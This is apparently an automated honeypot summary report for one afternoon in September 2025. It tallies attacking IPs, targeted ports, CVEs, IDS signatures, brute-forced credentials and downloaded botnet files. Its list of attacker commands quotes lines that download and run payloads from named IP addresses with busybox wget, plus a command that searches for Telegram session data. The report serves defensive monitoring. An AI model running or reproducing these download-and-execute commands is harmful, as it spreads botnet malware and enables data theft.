Honeypot Attack Summary Report

**Report Generation Time:** 2025-09-30T14:01:46Z
**Timeframe:** 2025-09-30T13:20:01Z to 2025-09-30T14:00:01Z
**Files Analyzed:**
- agg_log_20250930T132001Z.json
- agg_log_20250930T134001Z.json
- agg_log_20250930T140001Z.json

---

### Executive Summary

This report summarizes 13,229 security events collected from our honeypot network over the last hour. The majority of attacks were captured by the Suricata, Honeytrap, and Dionaea honeypots. A significant amount of activity originated from IP address `192.140.100.75`, which was responsible for a large number of SMB probes. The most frequently targeted port was `445/TCP`, consistent with attacks targeting the SMB service. Several CVEs were detected, with `CVE-2021-3449` being the most common. Attackers attempted a variety of commands, including reconnaissance and downloading of malicious payloads.

---

### Detailed Analysis

**Attacks by Honeypot:**
- Suricata: 3435
- Honeytrap: 3920
- Dionaea: 2948
- Ciscoasa: 1437
- Cowrie: 970
- Tanner: 155
- Heralding: 106
- Miniprint: 87
- Sentrypeer: 39
- Adbhoney: 35
- Redishoneypot: 28
- H0neytr4p: 21
- ConPot: 15
- Ipphoney: 8
- Honeyaml: 8
- Dicompot: 9
- Mailoney: 4
- ElasticPot: 2
- ssh-ed25519: 2

**Top Attacking IPs:**
- 192.140.100.75: 2548
- 200.171.181.146: 1940
- 45.140.17.153: 1001
- 45.134.26.20: 1000
- 185.156.73.167: 366
- 185.156.73.166: 366
- 92.63.197.55: 360
- 92.63.197.59: 328
- 202.88.244.34: 376
- 34.78.57.34: 196
- 31.165.173.54: 150
- 10.17.0.5: 141
- 45.94.31.74: 134
- 120.77.169.204: 129
- 196.251.80.79: 111
- 3.131.215.38: 88
- 156.238.16.164: 107
- 3.134.148.59: 64
- 103.144.2.208: 74
- 129.13.189.202: 60

**Top Targeted Ports/Protocols:**
- 445: 3827
- TCP/445: 1937
- 80: 154
- 8333: 170
- 22: 158
- TCP/1080: 116
- 9100: 87
- 5060: 39
- TCP/22: 21
- 23: 29
- 6379: 23
- 9000: 21
- 2222: 19
- 22222: 17
- TCP/8080: 11
- TCP/5432: 16
- 3306: 9
- 8728: 15
- 8729: 12
- 443: 20

**Most Common CVEs:**
- CVE-2021-3449
- CVE-2019-12263
- CVE-2019-12261
- CVE-2019-12260
- CVE-2019-12255
- CVE-2019-11500
- CVE-2009-2765
- CVE-2005-4050
- CVE-2002-0013
- CVE-2002-0012
- CVE-2021-35394

**Commands Attempted by Attackers:**
- /ip cloud print
- uname -a
- uname -m
- uname -s -v -n -r -m
- whoami
- ifconfig
- cat /proc/cpuinfo
- cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...
- cd /data/local/tmp/; busybox wget http://161.97.149.138/w.sh; sh w.sh; ...
- ps | grep '[Mm]iner'
- ps -ef | grep '[Mm]iner'
- ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata ...
- locate D877F783D5D3EF8Cs
- echo Hi | cat -n
- pwd
- ls -la /
- ps aux | head -10
- history | tail -5
- ssh -V
- env | head -10
- nproc
- hostname
- netstat -tulpn | head -10
- uptime
- mount | head -5
- INFO PRODINFO
- echo "cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps" | sh
- cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps

**Signatures Triggered:**
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication: 1933
- ET DROP Dshield Block Listed Source group 1: 478
- ET SCAN NMAP -sS window 1024: 217
- GPL INFO SOCKS Proxy attempt: 114
- ET WEB_SERVER Possible HTTP 404 XSS Attempt (Local Source): 137
- ET INFO Reserved Internal IP Traffic: 58
- ET INFO CURL User Agent: 19
- ET DROP Spamhaus DROP Listed Traffic Inbound group 32: 29
- ET SCAN Suspicious inbound to PostgreSQL port 5432: 16
- ET CINS Active Threat Intelligence Poor Reputation IP group 71: 11

**Users / Login Attempts:**
- oracle/oracle
- joe/joe123
- admin/abcd_1234
- admin/P@55word1234
- admin/123456trewq
- admin/comercial
- admin/apbj
- user/f2BTiiwhjRCeHx
- anonymous/
- testuser/testuser
- dev/dev
- admin/
- root/
- ubuntu/ubuntu
- tech/tech

**Files Uploaded/Downloaded:**
- arm.urbotnetisass
- arm5.urbotnetisass
- arm6.urbotnetisass
- arm7.urbotnetisass
- x86_32.urbotnetisass
- mips.urbotnetisass
- mipsel.urbotnetisass
- boatnet.mpsl
- w.sh
- c.sh
- wget.sh
- www.serv00.com
- fonts.gstatic.com
- css?family=Libre+Franklin...
- ie8.css?ver=1.0
- html5.js?ver=3.7.3

**HTTP User-Agents:**
- None observed in this timeframe.

**SSH Clients:**
- None observed in this timeframe.

**SSH Servers:**
- None observed in this timeframe.

**Top Attacker AS Organizations:**
- None observed in this timeframe.

---

### Key Observations and Anomalies

- The high volume of traffic on port 445, especially from IP `200.171.181.146` which triggered the "DoublePulsar Backdoor" signature, suggests a targeted campaign against SMB vulnerabilities.
- A recurring attack pattern involves the use of `busybox` and `curl` to download and execute shell scripts and binaries from IP addresses `94.154.35.154` and `161.97.149.138`. These appear to be attempts to install botnet clients.
- The variety of login attempts indicates widespread brute-forcing, with a mix of common default credentials and more complex passwords.
- The presence of commands searching for cryptocurrency miners (`[Mm]iner`) and Telegram data suggests attackers are looking for both computational resources to hijack and sensitive user data to exfiltrate.
